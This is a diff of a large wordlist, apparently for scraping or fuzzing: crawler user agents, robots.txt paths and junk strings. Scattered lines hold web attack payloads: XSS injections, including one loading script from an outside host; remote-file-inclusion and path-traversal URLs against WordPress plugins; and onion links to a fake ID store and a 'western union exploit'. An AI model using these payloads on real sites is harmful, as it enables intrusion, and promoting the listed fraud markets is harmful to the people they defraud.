 ukwizz/nutch-0.8.1 (ukwizz nutch crawler; http://www.ukwizz.com/)
@@ -23038,7 +23037,7 @@ updated/0.1-alpha (updated crawler; http://www.updated.com; crawler@updated.com)
 updated/0.1-beta (updated; http://www.updated.com; updated@updated.com)
 updated/0.1beta (updated.com; http://www.updated.com; crawler@updated.om)
 updates/order/*http://foundation.app/robots.txt
-updates/order/*http://wolfgangs.com/robots.txt
+updates/order/*http://owni.fr/robots.txt
 upload/http://news.gallup.com/robots.txt
 upload/http://verisign.com/robots.txt
 uqun\\8
@@ -23058,12 +23057,12 @@ us fake id store: http://en35tuzqmn4lofbk.onion/
 usa citizenship: http://xfnwyig7olypdq5r.onion/
 usbkcj8u8=ev[.ys\\
 user-agent: fileheap! file downloader (http://www.fileheap.com)
-user-reports/http://jfa.jp/robots.txt
+user-reports/http://habr.com/robots.txt
 user-reports/http://lockheedmartin.com/robots.txt
 user/http://ecfr.gov/robots.txt
-user/http://ign.com/robots.txt
+user/http://edweek.org/robots.txt
 userhttp://developers.cloudflare.com/robots.txt
-userhttp://xero.com/robots.txt
+userhttp://online.fliphtml5.com/robots.txt
 usho\\
 usho\\1
 usho\\2
@@ -23075,10 +23074,10 @@ usho\\7
 usho\\8
 usho\\9
 usyd-nlp-spider (http://www.it.usyd.edu.au/~vinci/bot.html)
-utilities/http://futureoflife.org/robots.txt
+utilities/http://castos.com/robots.txt
 utilities/http://seon.io/robots.txt
 utils/http://bcn.cat/robots.txt
-utils/http://openvpn.net/robots.txt
+utils/http://threema.ch/robots.txt
 utis1\\5
 utis1\\6
 utis\\9
@@ -23145,8 +23144,8 @@ vakes/0.01 (vakes; http://www.vakes.com/; search@vakes.com)
 var _=document\\x2ecreateelement(\'script\');
 var m='alert(0)';var o='';for(var i=0;i<m.length;i++) {o+='\\'+(m[i].charcodeat().tostring(8));}[]['\143\157\156\163\164\162\165\143\164\157\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\60\51')();[]['constructor']['constructor']
 var n = {a: "-alert(1)}//\", b: "-alert(1)}//\"};
+variation/http://finecooking.com/robots.txt
 variation/http://kitco.com/robots.txt
-variation/http://ucdavis.edu/robots.txt
 vast.xml?key=96be767fce1f2a81047fd6fc2c3c0af0&vastv=3.0&cp.id=ltttsa&cp.title=time%20lapse%20of%20dubai&cp.duration=4:37&cp.desc=a%20timelapse%20of%20a%20city%20that%20grew%20and%20developed%20facter%20than%20any%20other.&cp.page=&cp.random=4227&cp.d=videosupreme.com&cp.dr=http%3a%2f%2fvideosupreme.com%2fltttsa%2f&cb2=1455214881312
 vast.xml?key=b0e736bf975bdbdb221a0cf245ac648f&vastv=3.0&cp.id=ltttsa&cp.title=time%20lapse%20of%20dubai&cp.duration=4:37&cp.desc=a%20timelapse%20of%20a%20city%20that%20grew%20and%20developed%20facter%20than%20any%20other.&cp.page=&cp.random=4227&cp.d=videosupreme.com&cp.dr=http%3a%2f%2fvideosupreme.com%2fltttsa%2f&cb2=1455214875736
 vax\\
@@ -23167,30 +23166,26 @@ vccsouth\\6
 vccsouth\\7
 vccsouth\\8
 vccsouth\\9
-version/http://klm.com/robots.txt
 version/http://recaptcha.net/robots.txt
 version: pgpfreeware 6.5.2 for non-commercial use <http://www.pgp.com>
 version=*http://zawya.com/robots.txt
-versions/http://hermanmiller.com/robots.txt
 versions/http://publish.twitter.com/robots.txt
 versus 0.2 (+http://versus.integis.ch)
 vertex-ai/studio/redirect/http://elements.envato.com/robots.txt
 vertex-ai/studio/redirect/http://googleblog.blogspot.com/robots.txt
-vertex-ai/studio/redirect/http://ocw.mit.edu/robots.txt
+vertex-ai/studio/redirect/http://saveur.com/robots.txt
 vertex-ai/studio/redirect/http://tickettailor.com/robots.txt
 very."(),:;<>[]".very."very@\\ "very".unusual@strange.address.com
 verzamelgids/2.2 (http://www.verzamelgids.nl)
 video/\
 video/affiliate/http://dnevnik.si/robots.txt
-video/affiliate/http://globallogic.com/robots.txt
+video/affiliate/http://guggenheim.org/robots.txt
 vietnamese/search/\?query=.
 view$http://cast.google.com/robots.txt
-view$http://deutschlandfunkkultur.de/robots.txt
 view$http://hdfcbank.com/robots.txt
-view$http://siteresources.worldbank.org/robots.txt
-view$http://sway.office.com/robots.txt
+view$http://sony.com/robots.txt
 view$http://theworlds50best.com/robots.txt
-view-order/http://harpercollins.ca/robots.txt
+view-order/http://blog.avast.com/robots.txt
 viruses: http://ciac.llnl.gov
 viruses: http://e-comm.webopedia.com/
 visbot/2.0 (visvo.com crawler; http://www.visvo.com/bot.html; bot@visvo.com)
@@ -23207,9 +23202,10 @@ vortex/1.2 ( http://marty.anstey.ca/robots/vortex/)
 vortex/2.2 ( http://marty.anstey.ca/robots/vortex/)
 vortex/2.2 (+http://marty.anstey.ca/robots/vortex/)
 voteactivities/http://gfk.com/robots.txt
-voteactivities/http://iamsterdam.com/robots.txt
+voteactivities/http://wtop.com/robots.txt
 voyager/2.0 (http://www.kosmix.com/crawler.html)
 voyager/2.0 (http://www.kosmix.com/html/crawler.html)
+vpn-config/http://fotmob.com/robots.txt
 vpn-config/http://lidl.de/robots.txt
 vpngate/4.0 (compatible; msie 7.0; windows nt 5.1; trident/4.0; embeddedwb 14.52 from: http://www.bsalsa.com/ embeddedwb 14.52; slcc2; .net clr 2.0.50727; .net clr 3.5.30729; .net clr 3.0.30729; media center pc 6.0; f7144)
 vq*3>]rpy[>xhg%lfwde2pxw?^\\p3~dnc^pq7$!8mnyq7huzz
@@ -23222,7 +23218,7 @@ v{{{{{{p\\\\
 v|^y}m\\\\zivmm*vijqmyksh^l2y`pv
 w$\\
 w/index.phphttp://mbta.com/robots.txt
-w/index.phphttp://sloan.org/robots.txt
+w/index.phphttp://raw.githack.com/robots.txt
 w3c-mobileok/ddc-1.0 (see http://www.w3.org/2006/07/mobileok-ddc)
 w3c_validator/1.3 http://validator.w3.org/services
 w3sitesearch crawler_v1.1 http://www.w3sitesearch.de
@@ -23282,32 +23278,32 @@ webmeasurement-bot&#44; http://rvs.informatik.uni-leipzig.de
 webrankspider/1.37 (+http://ulm191.server4you.de/crawler/)
 websearch.com.au/3.0.1 (the australian search engine; http://websearch.com.au; search@websearch.com.au)
 websearchbench webcrawler v1.0 (beta)- prof. dr.-ing. christoph lindemann- universit&#228;t dortmund- cl@cs.uni-dortmund.de- http://websearchbench.cs.uni-dortmund.de/
+webservices/http://adp.com/robots.txt
 webservices/http://consumerlab.com/robots.txt
-webservices/http://fiserv.com/robots.txt
 webstats.torproject.org: http://gbinixxw7gnsh5jr.onion/
 webster v0.3 ( http://webster.healeys.net/ )
-websupport/restrictedhttp://ascd.org/robots.txt
 websupport/restrictedhttp://crutchfield.com/robots.txt
 webzip/3.5 (http://www.spidersoft.com)
 webzip/x.x (http://www.spidersoft.com)
 wedding-vendors/http://nsc.org/robots.txt
+wedding-vendors/http://opengeospatial.org/robots.txt
 western union exploit: http://qc7ilonwpv77qibm.onion/
 wget https://crowdshield.com/.testing/rce_vuln.txt
 wget/1.x(.x)gnu wget http://www.gnu.org/software/wget/wget.html - file downloader
-wiadomosci/strona-glowna,a,2727http://rawgit.com/robots.txt
+wiadomosci/strona-glowna,a,2727http://la7.it/robots.txt
 wiki leaks: http://zbnnr7qzaxlk5tms.onion/
-wiki/mediawiki%3aspam-blacklisthttp://bipm.org/robots.txt
-wiki/wikipedia%3avermittlungsausschuss%2fhttp://dropbox.com/robots.txt
-wiki/wikipedia%3avermittlungsausschuss%2fhttp://maps.app.goo.gl/robots.txt
-wiki/wikipedia%3avermittlungsausschuss%2fhttp://techcrunch.com/robots.txt
-wiki/wikipedia:checklijst_langdurig_structureel_vandalisme/http://c2.staticflickr.com/robots.txt
+wiki/mediawiki%3aspam-blacklisthttp://latlong.net/robots.txt
+wiki/wikipedia%3avermittlungsausschuss%2fhttp://deepl.com/robots.txt
+wiki/wikipedia%3avermittlungsausschuss%2fhttp://discord.gg/robots.txt
+wiki/wikipedia%3avermittlungsausschuss%2fhttp://ftc.gov/robots.txt
+wiki/wikipedia:achterkamertje/http://onlyoffice.com/robots.txt
 wiki/wikipedia:checklijst_langdurig_structureel_vandalisme/http://digistore24.com/robots.txt
-wiki/wikipedia_talk%3aadministrator_electionshttp://allaboutcookies.org/robots.txt
-wiki/wikipedia_talk%3aadministrator_electionshttp://apps.apple.com/robots.txt
+wiki/wikipedia_talk%3aadministrator_electionshttp://bilgematics.com/robots.txt
 wiki/wikipedia_talk%3aadministrator_electionshttp://css-tricks.com/robots.txt
-wiki/wikipedia_talk%3aadministrator_electionshttp://europarl.europa.eu/robots.txt
-wiki/wikipedia_talk%3aadministrator_electionshttp://open.spotify.com/robots.txt
-wiki/wikipedia_talk%3aadministrator_electionshttp://wiki.openstreetmap.org/robots.txt
+wiki/wikipedia_talk%3aadministrator_electionshttp://en.wikipedia.org/robots.txt
+wiki/wikipedia_talk%3aadministrator_electionshttp://engadget.com/robots.txt
+wiki/wikipedia_talk%3aadministrator_electionshttp://itunes.apple.com/robots.txt
+wiki/wikipedia_talk%3aadministrator_electionshttp://windows.microsoft.com/robots.txt
 willow321:\\\\\\\'#
 willow\\5
 win\\
@@ -23372,12 +23368,10 @@ wotbox/alpha0.6 (bot@wotbox.com; http://www.wotbox.com)
 wotbox/alpha0.x.x (bot@wotbox.com; http://www.wotbox.com) java/1.4.1_02
 wp-admin/\
 wp-admin/\par
-wp-admin/admin-ajax.phphttp://adweek.com/robots.txt
+wp-admin/admin-ajax.phphttp://amp.theguardian.com/robots.txt
 wp-admin/admin-ajax.phphttp://avtopomosh911.ru/robots.txt
 wp-admin/admin-ajax.phphttp://beacons.ai/robots.txt
-wp-admin/admin-ajax.phphttp://bible.com/robots.txt
 wp-admin/admin-ajax.phphttp://boredpanda.com/robots.txt
-wp-admin/admin-ajax.phphttp://catawiki.com/robots.txt
 wp-admin/admin-ajax.phphttp://chop.edu/robots.txt
 wp-admin/admin-ajax.phphttp://cigna.com/robots.txt
 wp-admin/admin-ajax.phphttp://collider.com/robots.txt
@@ -23387,32 +23381,33 @@ wp-admin/admin-ajax.phphttp://cssminifier.com/robots.txt
 wp-admin/admin-ajax.phphttp://dallasnews.com/robots.txt
 wp-admin/admin-ajax.phphttp://designspiration.com/robots.txt
 wp-admin/admin-ajax.phphttp://devrix.com/robots.txt
+wp-admin/admin-ajax.phphttp://downforeveryoneorjustme.com/robots.txt
 wp-admin/admin-ajax.phphttp://english.stackexchange.com/robots.txt
 wp-admin/admin-ajax.phphttp://extension.iastate.edu/robots.txt
 wp-admin/admin-ajax.phphttp://food.com/robots.txt
-wp-admin/admin-ajax.phphttp://getadblock.com/robots.txt
+wp-admin/admin-ajax.phphttp://glose.com/robots.txt
 wp-admin/admin-ajax.phphttp://govtech.com/robots.txt
 wp-admin/admin-ajax.phphttp://haikudeck.com/robots.txt
 wp-admin/admin-ajax.phphttp://itau.com.br/robots.txt
+wp-admin/admin-ajax.phphttp://journals.openedition.org/robots.txt
+wp-admin/admin-ajax.phphttp://lendingtree.com/robots.txt
+wp-admin/admin-ajax.phphttp://lifewithalacrity.com/robots.txt
 wp-admin/admin-ajax.phphttp://linuxquestions.org/robots.txt
 wp-admin/admin-ajax.phphttp://mdpr.jp/robots.txt
-wp-admin/admin-ajax.phphttp://mordorintelligence.com/robots.txt
-wp-admin/admin-ajax.phphttp://nationaltrust.org.uk/robots.txt
+wp-admin/admin-ajax.phphttp://mnemosyne-proj.org/robots.txt
+wp-admin/admin-ajax.phphttp://money.com/robots.txt
+wp-admin/admin-ajax.phphttp://muckrack.com/robots.txt
 wp-admin/admin-ajax.phphttp://nhs.uk/robots.txt
 wp-admin/admin-ajax.phphttp://nidirect.gov.uk/robots.txt
-wp-admin/admin-ajax.phphttp://optout.networkadvertising.org/robots.txt
 wp-admin/admin-ajax.phphttp://piie.com/robots.txt
-wp-admin/admin-ajax.phphttp://quicksprout.com/robots.txt
-wp-admin/admin-ajax.phphttp://schurorthodontics.com/robots.txt
-wp-admin/admin-ajax.phphttp://sciencedaily.com/robots.txt
-wp-admin/admin-ajax.phphttp://sciencespo.fr/robots.txt
-wp-admin/admin-ajax.phphttp://scripts.sil.org/robots.txt
-wp-admin/admin-ajax.phphttp://search.cpan.org/robots.txt
+wp-admin/admin-ajax.phphttp://remind.com/robots.txt
+wp-admin/admin-ajax.phphttp://rtbf.be/robots.txt
+wp-admin/admin-ajax.phphttp://sheets.google.com/robots.txt
+wp-admin/admin-ajax.phphttp://starbucks.com/robots.txt
 wp-admin/admin-ajax.phphttp://tastingtable.com/robots.txt
-wp-admin/admin-ajax.phphttp://uu.nl/robots.txt
-wp-admin/admin-ajax.phphttp://vi.wikipedia.org/robots.txt
-wp-admin/admin-ajax.phphttp://whc.unesco.org/robots.txt
-wp-admin/admin-ajax.phphttp://whois.com/robots.txt
+wp-admin/admin-ajax.phphttp://ucl.ac.uk/robots.txt
+wp-admin/admin-ajax.phphttp://wikileaks.org/robots.txt
+wp-admin/admin-ajax.phphttp://wpengine.com/robots.txt
 wp-admin/admin-ajax.phphttp://youtube.fr/robots.txt
 wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v15\'></script>
 wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v6\'></script>
@@ -23434,14 +23429,16 @@ wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&token=%22%
 wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&token=%22%3e%3cscript%20type=text/javascript%20src=%5c'https://slow.destinyfernandi.com/hos?&v6%5c'%3e%3c/script%3e
 wp-admin/admin-post.php?testingfsoc=1&url=https://pastebin.com/raw/i1gllhhj&filename=wpdemos
 wp-admin/http://crossway.org/robots.txt
-wp-admin/http://focus.de/robots.txt
+wp-admin/http://mnn.com/robots.txt
+wp-admin/http://seznam.cz/robots.txt
 wp-admin/http://umass.edu/robots.txt
-wp-content/mu-plugins/http://adjust.com/robots.txt
+wp-content/mu-plugins/http://afb.org/robots.txt
 wp-content/mu-plugins/http://hdr.undp.org/robots.txt
 wp-content/mu-plugins/http://patchstack.com/robots.txt
 wp-content/mu-plugins/http://prisma.io/robots.txt
+wp-content/mu-plugins/http://umich.edu/robots.txt
 wp-content/plugins/dm-albums/template/album.php?security_file=http://rfi.nessus.org/rfi.txt
-wp-content/plugins/http://heinlegal.com/robots.txt
+wp-content/plugins/http://anjunabeats.lnk.to/robots.txt
 wp-content/plugins/myflash/myflash-button.php?wppath=http://rfi.nessus.org/rfi.txt
 wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?mypath=http://rfi.nessus.org/rfi.txt
 wp-content/plugins/site-import/admin/page.php?url=http://rfi.nessus.org/rfi.txt
@@ -23450,43 +23447,42 @@ wp-content/plugins/wordtube/wordtube-button.php?wppath=http://rfi.nessus.org/rfi
 wp-content/plugins/wp-table/js/wptable-button.php?wppath=http://rfi.nessus.org/rfi.txt
 wp-content/themes/\
 wp-content/uploads/*http://fiberaltyapisorgulama.com/robots.txt
-wp-content/uploads/2018/08/2018-strategic-plan-8-28-18.pdfhttp://whirlpool.com/robots.txt
 wp-content/uploads/http://bgs.ac.uk/robots.txt
+wp-content/uploads/http://envato.com/robots.txt
 wp-content/uploads/http://mcafee.com/robots.txt
-wp-content/uploads/http://tangothessaloniki.com/robots.txt
-wp-content/uploads/http://usmint.gov/robots.txt
+wp-content/uploads/http://soprashop.com/robots.txt
+wp-content/uploads/http://us04web.zoom.us/robots.txt
 wp-content/uploads/http://waradu.dev/robots.txt
 wp-content/uploads/wp-import-export-lite/http://adsabs.harvard.edu/robots.txt
 wp-content/uploads/wp-import-export-lite/http://akamai.com/robots.txt
 wp-content/uploads/wp-import-export-lite/http://answers.yahoo.com/robots.txt
+wp-content/uploads/wp-import-export-lite/http://beckershospitalreview.com/robots.txt
 wp-content/uploads/wp-import-export-lite/http://cancerres.aacrjournals.org/robots.txt
-wp-content/uploads/wp-import-export-lite/http://castos.com/robots.txt
-wp-content/uploads/wp-import-export-lite/http://dresden.de/robots.txt
+wp-content/uploads/wp-import-export-lite/http://clang.llvm.org/robots.txt
+wp-content/uploads/wp-import-export-lite/http://deliciousbrains.com/robots.txt
 wp-content/uploads/wp-import-export-lite/http://fa.wikipedia.org/robots.txt
 wp-content/uploads/wp-import-export-lite/http://genesys.com/robots.txt
 wp-content/uploads/wp-import-export-lite/http://global.oup.com/robots.txt
 wp-content/uploads/wp-import-export-lite/http://ic.gc.ca/robots.txt
-wp-content/uploads/wp-import-export-lite/http://imaging.nikon.com/robots.txt
 wp-content/uploads/wp-import-export-lite/http://imperva.com/robots.txt
+wp-content/uploads/wp-import-export-lite/http://journals.lww.com/robots.txt
+wp-content/uploads/wp-import-export-lite/http://kiwix.org/robots.txt
 wp-content/uploads/wp-import-export-lite/http://mindtools.com/robots.txt
-wp-content/uploads/wp-import-export-lite/http://muse.jhu.edu/robots.txt
 wp-content/uploads/wp-import-export-lite/http://ncl.ac.uk/robots.txt
 wp-content/uploads/wp-import-export-lite/http://open.alberta.ca/robots.txt
+wp-content/uploads/wp-import-export-lite/http://pay.line.me/robots.txt
 wp-content/uploads/wp-import-export-lite/http://placehold.it/robots.txt
-wp-content/uploads/wp-import-export-lite/http://scobleizer.com/robots.txt
+wp-content/uploads/wp-import-export-lite/http://s3.ap-southeast-1.amazonaws.com/robots.txt
 wp-content/uploads/wp-import-export-lite/http://self-sufficiency.org/robots.txt
 wp-content/uploads/wp-import-export-lite/http://sparkfun.com/robots.txt
-wp-content/uploads/wp-import-export-lite/http://theepochtimes.com/robots.txt
-wp-content/uploads/wp-import-export-lite/http://thrivethemes.com/robots.txt
-wp-content/uploads/wp-import-export-lite/http://tookstookson.blogspot.com/robots.txt
 wp-content/uploads/wp-import-export-lite/http://weather.gc.ca/robots.txt
 wp-content/uploads/wp-import-export-lite/http://zola.com/robots.txt
-wp-content/uploads/wpo/wpo-plugins-tables-list.jsonhttp://aging-us.com/robots.txt
 wp-content/uploads/wpo/wpo-plugins-tables-list.jsonhttp://grahamcluley.com/robots.txt
+wp-content/uploads/wpo/wpo-plugins-tables-list.jsonhttp://hola.com/robots.txt
 wp-includes/js/jquery/\
 wp-login.php?redirect_to=http%3a%2f%2f%3f1%3c%2fscript%3e%3cscript%3ealert%28document.domain%29%3c%2fscript%3e
-wp-register.phphttp://draft.blogger.com/robots.txt
 wp-register.phphttp://leonardo.ai/robots.txt
+wp-register.phphttp://mobile.de/robots.txt
 wphttps://www.etracker.com/app/uploads/wpforms
 wps/cmis_proxy/http/www.redbooks.ibm.com/redbooks.nsf/redbookabstracts/sg247798.html?logout&redirectto=http://example.com
 wps/common_proxy/http/www.redbooks.ibm.com/redbooks.nsf/redbookabstracts/sg247798.html?logout&redirectto=http://example.com
@@ -23525,12 +23521,12 @@ wwsbot 1.x [--- http://www.analyzer.nu ---]
 www-staging.torproject.org: http://krkzagd5yo4bvypt.onion/
 www.onion-router.net: http://hzmun3rnnxjhkyhg.onion/
 www.torproject.org: http://expyuzz4wqqyqhjn.onion/
-www/search.do*http://diepresse.com/robots.txt
+www/search.do*http://queensu.ca/robots.txt
 www: http://web.nexor.co.uk/mak/mak.html
 www: http://web.nexor.co.uk/users/mak/mak.html
 www: http://www.cs.colorado.edu/home/mcbryan/home.html
 wwweasel robot v1.00 (http://wwweasel.de)
-wwwwww/http://grindr.com/robots.txt
+wwwwww/http://kleinanzeigen.de/robots.txt
 wwwwww/http://mytuner-radio.com/robots.txt
 wzj?p&\\4rgp#-"m^tey/ifv2cgrvl_
 w{{{{{{r\\\\
@@ -23584,8 +23580,8 @@ xmlpeek.aspx?dt=\\..\\..\\..\\..\\..\\..\\windows\\win.ini&x=/validate.ashx?requ
 xmlpeek.aspx?dt=\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini&x=/validate.ashx?requri
 xp0l=ug=n%t,?w)&,\\x\{pw^v4fqgon
 xrl/2.00b1 (linux; i686; en-us) (+http://metamark.net/about)
+xsl/http://maccosmetics.com/robots.txt
 xsl/http://protonmail.com/robots.txt
-xsl/http://wyndhamhotels.com/robots.txt
 xslt/http://cochrane.org/robots.txt
 xslt/http://madmimi.com/robots.txt
 xss=<link rel=import href=http://xss.cx/xss.js >
@@ -23602,7 +23598,7 @@ y!j/1.0 (http://help.yahoo.co.jp/help/jp/search/indexing/indexing-15.html)
 y$8%m)aa&^\\`<p?*3z8nsj,xhc/nq@
 y,\\
 y/http://cdiscount.com/robots.txt
-y/http://senate.gov/robots.txt
+y/http://whatsmyip.org/robots.txt
 y0uc4n\\\'tgu3551t
 y0uc4n\\\\\\\\\\\\\\\'tgu3551t
 y2cclj#_|?*!3tf@`.%2f\\}''8!bn0n
@@ -23761,10 +23757,10 @@ yoofind/yoofind-0.1-dev (yoono webcrawler; http://www.yoono.com ; myemail)
 yottacars_bot/4.12 (+http://www.yottacars.com) car search engine
 yottashopping_bot/4.12 (+http://www.yottashopping.com) shopping search engine
 you\\\'resoclever!!
+youreurope/businessdev/http://europarl.europa.eu/robots.txt
+youreurope/businessdev/http://foxnews.com/robots.txt
 youreurope/businessdev/http://mayoclinic.org/robots.txt
 youreurope/businessdev/http://nasa.gov/robots.txt
-youreurope/businessdev/http://streamelements.com/robots.txt
-youreurope/businessdev/http://worldbank.org/robots.txt
 ys"r\\_(voi7v(o?u/gu83bmb'\\x7f\{
 ys3c\\m[1)yd>ij*p"?yxy?cwe\{j%sp
 ystem32\\2bed\.exe;55
@@ -23867,11 +23863,11 @@ zermelo mozilla/5.0 compatible; heritrix/1.12.1 (+http://www.powerset.com) [emai
 zeusbot/0.07 (ulysseek's web-crawling robot; http://www.zeusbot.com; agent@zeusbot.com)
 zf*.lu>z'ffqk^8sx9hqm\\/bnmuubv
 zg\\
-zh-cnhttp://niehs.nih.gov/robots.txt
+zh-cnhttp://scotch.io/robots.txt
 zh-cnhttp://wordpress.stackexchange.com/robots.txt
-zh-tw/products/detailshttp://tropicalsmoothiecafe.com/robots.txt
+zh-tw/products/detailshttp://bandlab.com/robots.txt
 zh/internalhttp://emsc-csem.org/robots.txt
-zh/internalhttp://president.gov.ua/robots.txt
+zh/internalhttp://steelcase.com/robots.txt
 zh\\
 ziba/ziba-1.0.0 (zibalinks is an ongoing research project that aims to examine the relationships between websites, links, and people. ziba will be used as a statistical tool to demonstrate variations and behaviors in website links through time.; http://zibalinks.com)
 zipppbot/0.xx (zipppbot; http://www.zippp.net; webmaster@zippp.net)
@@ -23886,8 +23882,8 @@ zx\\1
 zxcvbnm,./\
 zyborg/1.0 (zyborg@wisenut.com; http://www.wisenut.com)
 zymic.com #http://zymic.com/
-zz_test/http://diasporafoundation.org/robots.txt
 zz_test/http://lanl.gov/robots.txt
+zz_test/http://theblock.co/robots.txt
 z{htwoj~,=wm~{r<d/idf4#\\[bq.\\%
 { "ua": "mozilla/5.0 applewebkit/537.36 (khtml, like gecko; compatible; googlebot/2.1; +http://www.google.com/bot.html) safari/537.36", "browser": { "name": "safari" }, "engine": { "version": "537.36", "name": "webkit" }, "os": {}, "device": {}, "cpu": {} }
 { &quot;ua&quot;: &quot;mozilla/5.0 applewebkit/537.36 (khtml, like gecko; compatible; googlebot/2.1; +http://www.google.com/bot.html) safari/537.36&quot;, &quot;browser&quot;: { &quot;name&quot;: &quot;safari&quot; }, &quot;engine&quot;: { &quot;version&quot;: &quot;537.36&quot;, &quot;name&quot;: &quot;webkit&quot; }, &quot;os&quot;: {}, &quot;device&quot;: {}, &quot;cpu&quot;: {} }
